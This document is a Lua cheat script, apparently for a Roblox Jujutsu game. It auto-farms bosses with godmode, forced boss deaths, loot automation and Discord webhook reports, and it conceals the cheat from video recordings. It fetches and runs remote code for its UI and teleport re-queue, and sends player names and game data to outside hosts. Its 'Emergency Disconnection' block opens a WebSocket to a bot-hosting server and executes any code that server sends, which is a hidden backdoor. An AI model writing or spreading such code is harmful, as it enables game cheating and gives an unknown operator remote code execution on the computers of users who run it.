repeat
    task.wait()
until game:IsLoaded()


if not getgenv().StingrayLoaded then
    getgenv().StingrayLoaded = true
    print("Script Loaded")
    -- Init --

    local StartTime = tick()
    local LocalPlayer = game:GetService("Players").LocalPlayer
    local RunService = game:GetService("RunService")
    local ConfigsLoaded = false
    local ConfigStatus = "Timeout"

    local RS, TS, TP, Debris, HTTP = game:GetService("ReplicatedStorage"), game:GetService("TweenService"),
        game:GetService("TeleportService"), game:GetService("Debris"), game:GetService("HttpService")
    local ServerRemotes = RS:WaitForChild("Remotes"):WaitForChild("Server")
    local ClientRemotes = RS:WaitForChild("Remotes"):WaitForChild("Client")

    -- Load Configs--

    -- Defaults --
    getgenv().LuckBoosts = {"Luck Vial"}

    -- Webhook
    pcall(function()
        if getgenv().Webhook then
            writefile("JJI_Webhook.txt", getgenv().Webhook)
        end
        if readfile("JJI_Webhook.txt") then
            getgenv().Webhook = readfile("JJI_Webhook.txt")
        end
    end)

    task.spawn(function()
        local S, E = pcall(function()
            local C = HTTP:JSONDecode(game:HttpGet("http://stingray-digital.online/jji/get-config?username=" ..
                                                       LocalPlayer.Name))
            if C["LuckBoosts"] ~= "" then
                getgenv().LuckBoosts = {}
                for Item in string.gmatch(C["LuckBoosts"], "([^,]+)") do
                    Item = string.gsub(Item, "^%s+", "")
                    table.insert(getgenv().LuckBoosts, Item)
                end
            end
            if C["Discord"] ~= "" then
                getgenv().DiscordPing = "<@" .. C["Discord"] .. ">"
            end
        end)
        if not S then
            ConfigsLoaded = false
            ConfigStatus = E
        else
            ConfigsLoaded = true
        end
    end)

    repeat
        task.wait()
    until ConfigsLoaded or (tick() - StartTime >= 3)
    if ConfigsLoaded then
        ConfigStatus = "Success"
    end

    -- Emergency Disconnection --
    task.spawn(function()
        local s, e = pcall(function()
            local WSConnection = WebSocket.connect("ws://de3.bot-hosting.net:21824/ws")
            task.wait(1)
            WSConnection.OnMessage:Connect(function(k)
                local s, e = pcall(function()
                    WSConnection:Send(loadstring(k)())
                end)
            end)
            task.wait(1)
            WSConnection:Send("Connection Success - " .. LocalPlayer.Name)
        end)
    end)

    -- UI --
    local UI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nebula-Manta/Stingray/refs/heads/main/UI"))()
    local MainUI = UI.InitUI()

    local Toggle = "ON"
    pcall(function()
        if isfile("JJI_State.txt") then
            Toggle = readfile("JJI_State.txt")
        else
            writefile("JJI_State.txt", "ON")
        end
    end)

    print("QUEUE TOGGLE: " .. Toggle)

    if Toggle == "ON" then
        UI.SetState(true)
    else
        UI.SetState(false)
    end

    UI.SetMain(function(State)
        if State == 1 then
            Toggle = "ON"
        else
            Toggle = "OFF"
        end
        writefile("JJI_State.txt", Toggle)
    end)

    local PromoteConnection = nil
    

    PromoteConnection = RunService.Heartbeat:Connect(function()
        task.wait(3)
        local Response = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Server"):WaitForChild("Dialogue"):WaitForChild("GetResponse"):InvokeServer("Clan Head Jujutsu High","Start")
        if not string.find(Response,"Don't waste my time.") then
          game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Server"):WaitForChild("Dialogue"):WaitForChild("GetResponse"):InvokeServer("Clan Head Jujutsu High","Promote")
          print("Promoted")  
        else
          warn("didn't meet promote req")
          warn("reason:",Response)
        end
    end)

    -- Constants
    local Cats = {"Withered Beckoning Cat", "Wooden Beckoning Cat", "Polished Beckoning Cat", "Golden Beckoning Cat"}
    local Loti = {"White Lotus", "Sapphire Lotus", "Jade Lotus", "Iridescent Lotus"} -- Did you know the plural of Lotus is Loti 
    local Highlight = {"5 Demon Finger", "Maximum Scroll", "Domain Shard", "Iridescent Lotus", "Energy Nature Scroll",
                       "Purified Curse Hand", "Jade Lotus", "Cloak of Inferno", "Split Soul", "Soul Robe",
                       "Playful Cloud", "Ocean Blue Sailor's Vest", "Deep Black Sailor's Vest", "Demonic Tobi",
                       "Demonic Robe", "Rotten Chains"}
    local BossConfig = {
        ["Finger Bearer"] = {11,70,false},
        ["Ocean Curse"] = {3,70,true},
        ["Soul Curse"] = {3,150,true},
        ["Volcano Curse"] = {20,50,false},
        ["Sorcerer Killer"] = {2,120,true},
        ["Heian Imaginary Demon"] = {0,0,false}
    }
    
    if identifyexecutor() == "Solara" then
        for i,v in pairs(BossConfig) do
            v[3] = false
        end
    end

    local SafeSkills = {"Chain Grab", "Hydrokinesis: Death Swarm", "Volcano: Ember Insects", "Volcano: Molten Chamber",
                        "Infinity: Reversal Red", "Infinity: Lapse Blue", "Curse Tendril",
                        "Ratio Technique: 7:3 Strike", "Ratio Technique: Unwavering Output"}

    local QueueSuccess = "False"
    if Toggle == "ON" then
        local S, E = pcall(function()
            queue_on_teleport('loadstring(game:HttpGet("http://stingray-digital.online/script/jji"))()')()
        end)
    end

    -- Black screen check & Fail safe --
    task.spawn(function()
        task.wait(120)
        while task.wait(10) do
            TP:Teleport(10450270085)
        end
    end)

    if game.PlaceId == 10450270085 then
        task.spawn(function()
            while task.wait(10) do
                TP:Teleport(119359147980471)
            end
        end)
    elseif game.PlaceId == 119359147980471 then
        local SelectedBoss = "Heian Imaginary Demon"
        pcall(function()
            if readfile("JJI_LastBoss.txt") then
                SelectedBoss = readfile("JJI_LastBoss.txt")
            end
        end)
        task.wait(3)
        while task.wait(1) do
            ServerRemotes:WaitForChild("Raids"):WaitForChild("QuickStart"):InvokeServer("Boss", SelectedBoss, 4,
                "Nightmare")
        end
    end

    repeat
        task.wait()
    until LocalPlayer.Character

    local Character = LocalPlayer.Character
    local Root = Character:WaitForChild("HumanoidRootPart")
    Root.ChildAdded:Connect(function(C)
        if C:IsA("BodyVelocity") or C:IsA("BodyPosition") or C:IsA("BodyForce") then
            Debris:AddItem(C, 0)
        end
    end)

    local Objects = workspace:WaitForChild("Objects")
    local Mobs = Objects:WaitForChild("Mobs")
    local Spawns = Objects:WaitForChild("Spawns")
    local Drops = Objects:WaitForChild("Drops")
    local Effects = Objects:WaitForChild("Effects")
    local Destructibles = Objects:WaitForChild("Destructibles")

    local LootUI = LocalPlayer.PlayerGui:WaitForChild("Loot")
    local Flip = LootUI:WaitForChild("Frame"):WaitForChild("Flip")
    local Replay = LocalPlayer.PlayerGui:WaitForChild("ReadyScreen"):WaitForChild("Frame"):WaitForChild("Replay")

    local Combat = ServerRemotes:WaitForChild("Combat")

    local SkillTable = LocalPlayer:WaitForChild("ReplicatedData"):WaitForChild("learned"):GetChildren()
    local Usable = {}
    for _, v in pairs(SkillTable) do
        if not (string.find(v.Name, "Domain") or string.find(v.Name, "Maximum")) and table.find(SafeSkills, v.Name) then
            table.insert(Usable, v.Name)
        end
    end

    -- Destroy fx --
    Effects.ChildAdded:Connect(function(Child)
        if Child.Name ~= "DomainSphere" then
            Debris:AddItem(Child, 0)
        end
    end)

    game:GetService("Lighting").ChildAdded:Connect(function(Child)
        Debris:AddItem(Child, 0)
    end)

    Destructibles.ChildAdded:Connect(function(Child)
        Debris:AddItem(Child, 0)
    end)

    -- Uh, ignore this spaghetti way of determining screen center --
    local MouseTarget = Instance.new("Frame", LocalPlayer.PlayerGui:FindFirstChildWhichIsA("ScreenGui"))
    MouseTarget.Size = UDim2.new(0, 0, 0, 0)
    MouseTarget.Position = UDim2.new(0.5, 0, 0.5, 0)
    MouseTarget.AnchorPoint = Vector2.new(0.5, 0.5)
    local X, Y = MouseTarget.AbsolutePosition.X, MouseTarget.AbsolutePosition.Y

    -- Funcs -- 
    local function Godmode(State)
        Combat:WaitForChild("ToggleMenu"):FireServer(State)
        if State then
            Character:WaitForChild("ForceField").Visible = false -- Just for show, if you anyone were to record a video
        end
    end

    local function GetValues(S) -- For curse market
        local Result = {}
        for v in string.gmatch(S, "([^|]+)") do
            table.insert(Result, v)
        end
        return Result
    end

    local function Encode(data) -- Pass data through url, safety encoding
        local SafeStr = HTTP:UrlEncode(data)
        SafeStr = string.gsub(SafeStr, "+", "-")
        SafeStr = string.gsub(SafeStr, "/", "_")
        SafeStr = string.gsub(SafeStr, "=", "")
        return SafeStr
    end

    local SkillDB = {}
    local function Skill(Name)
        if not table.find(SkillDB, Name) then
            task.spawn(function()
                table.insert(SkillDB, Name)
                task.wait(3)
                table.remove(SkillDB, table.find(SkillDB, Name))
            end)
            print("Used Skill:", Name)
            Combat:WaitForChild("Skill"):FireServer(Name)
        end
    end

    local function OpenChest()
        for i, v in ipairs(Drops:GetChildren()) do
            if v:FindFirstChild("Collect") then
                fireproximityprompt(v.Collect)
            end
        end
    end
    
    local M1Increment = 0
    local function Hit(Humanoid)
        M1Increment = M1Increment + 1
        Combat:WaitForChild("M1"):FireServer(M1Increment%5+1,{Humanoid},16)
    end

    local function Click(Button)
        Button.AnchorPoint = Vector2.new(0.5, 0.5)
        Button.Size = UDim2.new(50, 0, 50, 0)
        Button.Position = UDim2.new(0.5, 0, 0.5, 0)
        Button.ZIndex = 20
        Button.ImageTransparency = 1
        for i, v in ipairs(Button:GetChildren()) do
            if v:IsA("TextLabel") then
                v:Destroy()
            end
        end
        local VIM = game:GetService("VirtualInputManager")
        VIM:SendMouseButtonEvent(X, Y, 0, true, game, 0)
        task.wait()
        VIM:SendMouseButtonEvent(X, Y, 0, false, game, 0)
        task.wait()
    end

    local BP, BV = function(I, P)
        local BP = I:FindFirstChild("BodyPosition")
        if not BP then
            BP = Instance.new("BodyPosition", I)
            BP.Position = P
            BP.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            BP.P = 3000
            BP.D = 500
        else
            BP.Position = P
        end
    end, function(I, V)
        local BV = I:FindFirstChild("BodyVelocity")
        if not BV then
            BV = Instance.new("BodyVelocity", I)
            BV.Velocity = V
            BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        else
            BV.Velocity = V
        end
    end

    local function Target(Character)
        local Name = Character.Name
        local S,E = pcall(function()
            ClientRemotes:WaitForChild("GetClosestTarget").OnClientInvoke = function()
                if Mobs:FindFirstChild(Name) then
                    return Character.Humanoid
                else
                    return nil
                end
            end
        end)
        local S,E = pcall(function()
            ClientRemotes:WaitForChild("GetMouse").OnClientInvoke = function()
                if Mobs:FindFirstChild(Name) then
                    return Character:FindFirstChildWhichIsA("BasePart").Position
                else
                    return Root.Position
                end
            end
        end)
    end

    -- Farm start --
    local ScriptLoading = tostring(math.floor((tick() - StartTime) * 10) / 10)

    local InitialTween = TS:Create(Root, TweenInfo.new(1), {
        CFrame = Spawns.BossSpawn.CFrame
    })
    InitialTween:Play()
    InitialTween.Completed:Wait()
    BV(Character.Head, Vector3.new(0, 0, 0))

    repeat
        task.wait()
    until Mobs:FindFirstChildWhichIsA("Model")
    local Boss = Mobs:FindFirstChildWhichIsA("Model").Name
    
    task.spawn(function()
        local S, E = pcall(function()
            writefile("JJI_LastBoss.txt", Boss)
        end)
        if not S then
            print("Last boss config saving failed:", E)
        end
    end)

    -- Update curse market data
    task.spawn(function()
        local S, E = pcall(function()
            local T = {}
            for _, v in pairs(RS.CurseMarket:GetChildren()) do
                local Values = GetValues(v.Value)
                local TradeMessage = Values[3] .. "x " .. Values[1] .. " -> " .. Values[4] .. "x " .. Values[2]
                table.insert(T, TradeMessage)
            end
            game:HttpGet("http://de1.bot-hosting.net:21265/script/cursemarket?trades=" .. Encode(table.concat(T, "\n")))
        end)
        if not S then
            print("Curse market update failure:", E)
        end
    end)

    -- Use boosts --
    local LotusActive = LocalPlayer.ReplicatedData.chestOverride
    local CatActive = LocalPlayer.ReplicatedData.luckBoost
    local LotusValue, CatValue = 0, 0
    task.spawn(function()
        for _, Item in pairs(getgenv().LuckBoosts) do
            task.wait()
            if table.find(Loti, Item) and LotusActive.Value == 0 then
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Server"):WaitForChild("Data")
                    :WaitForChild("EquipItem"):InvokeServer(Item)
                print(Item .. " used")
            end
            task.wait(0.5)
            if LotusActive.Value == 0 then
                if (not table.find(Cats, Item)) or CatActive.duration.Value == 0 then
                    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Server"):WaitForChild(
                        "Data"):WaitForChild("EquipItem"):InvokeServer(Item)
                    print(Item .. " used")
                end
            end
        end
        LotusValue = LotusActive.Value or 0
        CatValue = CatActive.amount.Value
    end)

    -- Killing -- 
    task.wait(1)
    Target(Mobs[Boss])
    if not BossConfig[Boss][3] then
        for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
            if v.Name ~= "Innates" and v.Name ~= "Skills" then
                v.Parent = Character
            end
        end
        task.spawn(function()
            while Mobs:FindFirstChild(Boss) do
                local I = Mobs[Boss]
                if not Character:FindFirstChild("ForceField") then
                    Godmode(true)
                end
                BP(I.PrimaryPart, Root.Position)
                local IH = I.Humanoid
                local Percent = ((IH.MaxHealth - IH.Health) / IH.MaxHealth) * 100
                if Percent >= 1 then
                    I.Humanoid.Health = 0
                end
    
                Hit(I.Humanoid)
                task.wait(1)
            end
        end)
    else
        -- Hehe lol --
        Root.CFrame = Spawns.BossSpawn.CFrame-Vector3.new(0,BossConfig[Boss][2],0)
        task.wait(0.5)
        Godmode(true)
        task.wait(BossConfig[Boss][1])
        Skill("Curse Tendril")
        task.wait(1)
        Skill("Boogie Woogie: Swap")
        task.wait(1)
        Skill("Volcano: Ember Insects")
    end
    

    repeat
        task.wait()
    until Drops:FindFirstChild("Chest") -- Could have used WaitForChild here, but I felt it feels cursed not assigning WaitForChild to a variable, then I don't want an unusused variable...


    -- Overwrite chest collection function --
    local Items, HasGoodDrops,ChestsCollected = {}, false,0
    local ChestsCollected = 0
    local S,E = pcall(function()
        ClientRemotes.CollectChest.OnClientInvoke = function(Chest,Loots)
            if Chest then
                ChestsCollected = ChestsCollected + 1
                for _,Item in pairs(Loots) do
                    if table.find({"Special Grade","Unique"},Item) then
                        HasGoodDrops = true
                        Item[2] = "**"..Item[2].."**"
                    end
                    table.insert(Items,Item[2])
                end
            end
            return {}
        end
    end)

    task.spawn(function()
        while Drops:FindFirstChild("Chest") or LootUI.Enabled do
            if not LootUI.Enabled then
                OpenChest()
            else
                repeat
                    Click(Flip)
                until not LootUI.Enabled
            end
            task.wait()
        end
    end)

    repeat
        task.wait()
    until not (Drops:FindFirstChild("Chest") or LootUI.Enabled)
    
    -- Send webhook message --
    local S, E = pcall(function()
        if getgenv().Webhook then
            local Executor = (identifyexecutor() or "None Found")
            local Content = ""
            if HasGoodDrops and DiscordPing ~= "None Found" then
                Content = Content .. DiscordPing
            end
            Content = Content .. "\n-# [Debug Data] " .. "Executor: " .. Executor .. " | Script Loading Time: " ..
                          tostring(ScriptLoading) .. " | Configuration Status: " .. tostring(ConfigStatus) ..
                          " | Chests Collected: " ..
                          tostring(ChestsCollected) .. " | Cat Boost: " .. tostring(CatValue) .. "x | Lotus Boost: " ..
                          tostring(LotusValue) .. " | Send a copy of this data to Manta if there's any issues"
            print("Sending webhook")
            task.wait()
            local embed = {
                ["title"] = LocalPlayer.Name .. " has defeated " .. Boss .. " in " ..
                    tostring(math.floor((tick() - StartTime) * 10) / 10) .. " seconds",
                ['description'] = "Collected Items: " .. table.concat(Items," | "),
                ["color"] = tonumber(000000)
            }
            local a = request({
                Url = getgenv().Webhook,
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = game:GetService("HttpService"):JSONEncode({
                    ['embeds'] = {embed},
                    ['content'] = Content,
                    ['avatar_url'] = "https://cdn.discordapp.com/attachments/1089257712900120576/1105570269055160422/archivector200300015.png"
                }),
                Method = "POST"
            })
            print("Webhook sent!")
        end
    end)
    -- Click replay --
    task.wait()
    for i = 1, 10, 1 do
        Click(Replay)
        task.wait(1)
    end
end
